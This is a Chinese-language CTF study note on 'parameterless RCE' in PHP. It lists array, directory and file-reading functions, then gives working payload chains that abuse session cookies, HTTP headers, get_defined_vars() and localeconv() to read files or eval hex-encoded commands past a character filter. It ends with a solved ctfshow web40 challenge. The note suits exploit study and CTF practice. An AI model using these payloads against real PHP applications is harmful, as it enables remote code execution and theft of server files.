---
title: 无参RCE
description: 无参RCE笔记
tags:
  - CTF
  - WEB
categories:
  - 笔记
cover: 'https://tuchuang.voooe.cn/images/2024/05/05/_202405052101083.jpg'
abbrlink: 无参RCE[4]
date: 2024-05-14 01:13:00
---

## 常用函数
### 目录操作
```php
getchwd() - 函数返回当前工作目录。
chdir() - 函数改变当前的目录。
dirname() - 函数返回路径中的目录部分。
scandir() - 函数返回指定目录中的文件和目录的数组。
glob() - 同上
```
### 数组操作
```php
移动：
end()   - 将内部指针指向数组中最后一个元素，并输出。
next()  - 将内部指针指向数组中的下一个元素，并输出。
prev()  - 将内部指针指向数组中的上一个元素，并输出。
reset() - 将内部指针指向数组中的第一个元素，并输出。
each() - 返回当前元素的键名和键值，并将内部指针向前移动。

current() - 返回数组中的第一个单元
pos() - 同上
strrev() - 用于反转给定字符串
array_reverse() - 将数组内容反转
localeconv() - 返回一包含本地数字及货币格式信息的数组。（数组第一项是‘.’）
array_shift() - 删除数组中第一个元素，并返回被删除元素的值。
array_flip() - 交换数组中的键和值，成功时返回交换后的数组
array_rand() - 从数组名中随机取出一个或多个单元
```
### 读文件操作
```php
readfile() - 读取文件。
readgzfile() - 可用于读取非 gzip 格式的文件
show_source() - 显示文件(语法高亮)。
highlight_file() - 显示文件(语法高亮)。
file_get_contents() - 把整个文件读成一个字符串。
```
### 字符串操作
```php
hex2bin() - 将16进制转换为ASCII字符
```
### 打印操作
```php
print() - 直接打印(不能打印数组和对象)
print_r() - 直接打印(数组用结构表示)
var_export() - 按类型直接打印内容(整数直接打印，字符(串)带上''打印)
var_dump() - 打印类型长度和内容
debug_zval_dump() - 在var_dump()基础上多了点别的
```

## 利用session
### 读文件
```php
Cookie：PHPSESSID=要读的文件路径
readfile(session_id(session_start()));
#开启会话并读取SESSID的内容，readfile可替换为其他读文件函数
```
### 命令执行
```php
#注意PHPSESSIID中只能有A-Z;a-z;0-9，建议搭配字符串函数进行
#例如使用hex2bin() - 将16进制转换为字符串
Cookie：PHPSESSID=命令(十六进制编码)
eval(hex2bin(session_id(session_start())));
```

## 利用getallheaders()(apache环境)
> 返回所有http头部信息

```php
var_dump(getallheaders());数组打印所有头部信息
改变某个头的内容为文件路径再用随机函数读取(多试几次)
readfile(array_rand(array_flip(getallheaders())));
#命令执行同理
```
## 利用get_defined_vars()
> 数组形式返回所有当前已定义的变量（$_GET $_POST $_FILES $_COOKIE)

uri/?a=/flag
然后print_r(get_defined_vars());可以看到a=/flag的位置
```
Array ( [_GET] => Array ( [moran] => flag [a] => /flag ) [_POST] => Array ( [flag] => please_give_me_flaG [task] => print_r(get_defined_vars()); ) [_COOKIE] => Array ( ) [_FILES] => Array ( ) [str1] => print_r(get_defined_vars()); [str2] => please_give_me_flaG )
```
**这是一个大数组套着许多的小数组，例子中参数a在第一个数组里第二位
我们可用current或者reset来先从大数组里返回第一个小数组，然后使用next或者end来回显该小数组中第二个键的值**
```php
print_r(next(reset(get_defined_vars())));回显:/flag
readfile(next(reset(get_defined_vars()));读出/flag
#命令执行同理
```
## 别的姿势
#### localeconv()
```php
current(localeconv());可以构造'.'符号
print_r(scandir(current(localeconv()))); = ls
```
### getcwd()
```php
print_r(getcwd());打印当前目录路径，例如/var/www/html
print_r(dirname(getcwd()));打印指定路径的目录，例如/var/www
继续结合chdir() - 改变当前目录
print_r(scandir((dirname(getcwd()))));列出上一级目录文件名
```
### 其他payload
```php
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); 
//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));
//这个得爆破
```
## 读取根目录
```php
strrev(crypt(serialize(array())))所获得的字符串第一位有几率是/
print_r(scandir(strrev(crypt(serialize(array()))))) = ls /
```
## 例题：ctfshow web入门40
```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```
print_r(scandir(current(localeconv())));列出当前目录下的文件
```
Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
```
flag.php位于第三位，我们可以先reverse后用next带出上一个文件
print_r(next(array_reverse(scandir(current(localeconv())))));
```
flag.php
```
直接读flag
highlight_file(next(array_reverse(scandir(current(localeconv())))));
> 使用highlight_file,show_source函数前端回显，可直接看到flag
> 使用readfile,file_get_contents等函数前端不回显，需查看源码


























参考文章
[RCE篇之无参数rce](https://arsenetang.github.io/2021/09/26/RCE篇之无参数rce "RCE篇之无参数rce")